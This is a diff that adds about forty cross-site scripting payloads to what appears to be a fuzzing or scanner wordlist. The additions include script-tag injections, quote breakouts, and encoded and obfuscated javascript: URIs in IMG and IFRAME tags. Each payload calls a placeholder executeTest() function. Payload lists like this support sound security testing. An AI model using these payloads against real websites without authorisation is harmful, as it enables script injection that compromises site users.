@@ -23,3 +23,42 @@
 ><iframe src="javascript:executeTest()">
 '><iframe src="javascript:executeTest()">
 "><iframe src="javascript:executeTest()">
+"><script>"
+<script>executeTest()</script>
+<<script>executeTest();//<</script>
+<script>alert(executeTest())</script>
+'><script>alert(executeTest())</script>
+'><script>alert(executeTest());</script>
+\";executeTest();//
+%3cscript%3EexecuteTest();%3c/script%3e
+%3cscript%3EexecuteTest();%3c%2fscript%3e
+%3Cscript%3Ealert(%22X%20SS%22);%3C/script%3E
+&ltscript&gtalert(executeTest());</script>
+&ltscript&gtalert(executeTest());&ltscript&gtalert
+<xss><script>executeTest()</script></vulnerable>
+<IMG%20SRC='javascript:executeTest()'>
+<IMG%20SRC="javascript:executeTest();">
+<IMG%20SRC="javascript:executeTest()"
+<IMG%20SRC=javascript:executeTest()>
+<IMG%20SRC=JaVaScRiPt:executeTest()>
+<IMG%20SRC=javascript:executeTest()>
+<IMG%20SRC=`javascript:executeTest()`>
+<IMG%20"""><SCRIPT>executeTest()</SCRIPT>">
+<IMG%20SRC=javascript:executeTest()>
+<IMG%20SRC='javasc	ript:executeTest();'>
+<IMG%20SRC="jav	ascript:executeTest();">
+<IMG%20SRC="jav&#x09;ascript:executeTest();">
+<IMG%20SRC="jav&#x0A;ascript:executeTest();">
+<IMG%20SRC="jav&#x0D;ascript:executeTest();">
+<IMG%20SRC="%20&#14;%20javascript:executeTest();">
+<IMG%20DYNSRC="javascript:executeTest()">
+<IMG%20LOWSRC="javascript:executeTest()">
+<IMG%20SRC='%26%23x6a;avasc%26%23000010ript:executeTest();'>
+'%3CIFRAME%20SRC=javascript:executeTest();%3E%3C/IFRAME%3E
+"><script>executeTest()</script>
+%22%3E%3Cscript%3EexecuteTest()%2Fscript%3E
+';executeTest()//\';executeTest()//
+";executeTest()//\";
+executeTest())//>
+</SCRIPT>!--<SCRIPT>executeTest()</SCRIPT>=&{}
+'';!--"executeTest()=&{()}
